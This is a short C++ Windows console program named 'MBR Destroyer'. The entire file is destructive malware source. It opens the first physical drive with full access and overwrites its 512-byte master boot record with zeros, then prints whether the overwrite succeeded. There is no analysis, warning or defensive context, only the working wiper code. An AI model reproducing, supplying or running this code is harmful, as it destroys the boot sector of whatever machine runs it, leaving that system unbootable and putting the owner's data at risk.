// MBR Destroyer.cpp : Defines the entry point for the console application.
//

#include <Windows.h>
#include <iostream>
using namespace std;

int main()
{
	DWORD write;
	char mbrData [512] ; //rozmiar mbr

	ZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",
		GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, NULL, NULL);
		if (WriteFile(MasterBootRecord, mbrData, 512, &write, NULL))
		{
			cout << "MBR over written!" << endl;
			Sleep(5000);
			ExitProcess(0);
		}
		else
		{
			cout << "MBR over write failed!";
			Sleep(5000);
			ExitProcess(0);
		}
	CloseHandle(MasterBootRecord);

	return EXIT_SUCCESS;


}
